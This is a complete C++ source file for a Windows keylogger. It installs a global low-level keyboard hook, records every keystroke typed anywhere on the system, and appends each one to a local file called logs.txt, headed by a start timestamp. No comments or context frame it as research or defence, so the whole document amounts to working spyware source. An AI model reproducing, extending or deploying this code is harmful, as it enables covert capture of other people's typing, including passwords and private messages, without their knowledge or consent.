#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>

std::ofstream logfile;

void writeLog(const std::string& log) {
    logfile.open("logs.txt", std::ios::app);
    if (logfile.is_open()) {
        logfile << log;
        logfile.close();
    }
}

LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyInfo = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            char key = static_cast<char>(pKeyInfo->vkCode);
            writeLog(std::string(1, key));
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    SYSTEMTIME systemTime;
    GetLocalTime(&systemTime);

    char startTime[20];
    sprintf(startTime, "%04d-%02d-%02d %02d:%02d:%02d", systemTime.wYear, systemTime.wMonth, systemTime.wDay, systemTime.wHour, systemTime.wMinute, systemTime.wSecond);

    writeLog("Script started at ");
    writeLog(startTime);
    writeLog(" : ");

    HHOOK keyboardHookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHook, GetModuleHandle(NULL), 0);

    if (keyboardHookHandle == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHookHandle);
    return 0;
}
